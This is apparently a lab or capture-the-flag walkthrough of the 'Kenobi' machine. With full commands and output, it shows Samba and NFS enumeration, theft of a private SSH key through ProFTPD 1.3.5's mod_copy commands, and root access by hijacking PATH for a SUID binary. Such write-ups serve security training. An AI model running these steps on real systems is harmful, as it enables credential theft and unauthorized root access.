#smb

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 

## Task 1 Deploy the vulnerable machine

### Make sure you're connected to our network and deploy the machine
ok

### Scan the machine with nmap, how many ports are open?

```
nmap -sV -v 10.10.207.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:53 CDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 11:53
Scanning 10.10.207.144 [2 ports]
Completed Ping Scan at 11:53, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:53
Completed Parallel DNS resolution of 1 host. at 11:53, 0.04s elapsed
Initiating Connect Scan at 11:53
Scanning 10.10.207.144 [1000 ports]
Discovered open port 22/tcp on 10.10.207.144
Discovered open port 139/tcp on 10.10.207.144
Discovered open port 21/tcp on 10.10.207.144
Discovered open port 111/tcp on 10.10.207.144
Discovered open port 445/tcp on 10.10.207.144
Discovered open port 80/tcp on 10.10.207.144
Increasing send delay for 10.10.207.144 from 0 to 5 due to 62 out of 205 dropped probes since last increase.
Discovered open port 2049/tcp on 10.10.207.144
Completed Connect Scan at 11:53, 18.77s elapsed (1000 total ports)
Initiating Service scan at 11:53
Scanning 7 services on 10.10.207.144
Completed Service scan at 11:54, 12.60s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.207.144.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.83s elapsed
Initiating NSE at 11:54
Completed NSE at 11:54, 0.81s elapsed
Nmap scan report for 10.10.207.144
Host is up (0.19s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.42 seconds
                                                                                          
```

## Task 2 Enumerating Samba for shares

### Once you're connected, list the files on the share. What is the file can you see?
- listar los shares con nmap
```
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.207.144 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:58 CDT
Nmap scan report for 10.10.207.144
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.207.144\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.207.144\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.207.144\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds

```

```
smbclient -L //10.10.207.144
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI
```

```
smbclient //10.10.207.144/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 05:49:09 2019
  ..                                  D        0  Wed Sep  4 05:56:07 2019
  log.txt                             N    12237  Wed Sep  4 05:49:09 2019
get
                9204224 blocks of size 1024. 6877108 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (15.3 KiloBytes/sec) (average 15.3 KiloBytes/sec)
smb: \> exit

```


- datos en log.txt
```
# Set the user and group under which the server will run.
User				kenobi
Group				kenobi
```

### What port is FTP running on?
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
```

21
### What mount can we see?

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.249.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 09:09 CDT
Nmap scan report for 10.10.249.9
Host is up (0.18s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836544.0  6877084.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
                                                                

```

```
rpcinfo -p 10.10.207.144
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  41872  mountd
    100005    1   tcp  59447  mountd
    100005    2   udp  56638  mountd
    100005    2   tcp  50691  mountd
    100005    3   udp  37556  mountd
    100005    3   tcp  58271  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049  nfs_acl
    100227    3   tcp   2049  nfs_acl
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049  nfs_acl
    100227    3   udp   2049  nfs_acl
    100021    1   udp  47770  nlockmgr
    100021    3   udp  47770  nlockmgr
    100021    4   udp  47770  nlockmgr
    100021    1   tcp  38069  nlockmgr
    100021    3   tcp  38069  nlockmgr
    100021    4   tcp  38069  nlockmgr

```

```
showmount -e 10.10.207.144
Export list for 10.10.207.144:
/var *
```

/var

##  Task 3 Gain initial access with ProFtpd
Proftpd

### What is the version?
```
21/tcp   open  ftp         ProFTPD 1.3.5
```

### How many exploits are there for the ProFTPd running?

```
searchsploit ProFTPD 1.3.5
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploi | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution     | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                               | linux/remote/36742.txt
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

4

### We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 


### We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

- copiamos la llave privada
```
nc 10.10.207.144 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.144]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
^C

```

- montamos la share y la copiamos
```
sudo mkdir /mnt/kenobi
sudo mount 10.10.207.144:/var /mnt/kenobi
ls -la /mnt/kenobi/  
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Mar 20 12:29 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Mar 20 12:28 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

- copiamos la lleve, cambiamos permisos y usamos
```
cp /mnt/kenobi/tmp/id_rsa .

sudo umount /mnt/kenobi

sudo chmod 600 id_rsa 

ssh -i id_rsa kenobi@10.10.207.144

The authenticity of host '10.10.207.144 (10.10.207.144)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? 

* Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 

kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 

```

###  Task 4 Privilege Escalation with Path Variable Manipulation

### What file looks particularly out of the ordinary? 
```
find / -perm -u=s -type f 2>/dev/null

or

find / -user root -perm /4000 2>/dev/nul


/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd

/usr/bin/menu

/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

/usr/bin/menu

### Run the binary, how many options appear?

```
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 20 Mar 2024 17:36:58 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

```

3

```
strings -n 10 /usr/bin/menu 
/lib64/ld-linux-x86-64.so.2
__isoc99_scanf
__stack_chk_fail
__libc_start_main
__gmon_start__
GLIBC_2.2.5
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost

```

### We copied the /bin/sh shell, called it curl,

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH

echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin



```

### What is the root flag (/root/root.txt)?
```
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cd /root
# ls -a
.  ..  .bash_history  .bashrc  .cache  .profile  root.txt  .viminfo
# cat root.txt  
177b3cd8562289f37382721c28381f02
# 
```
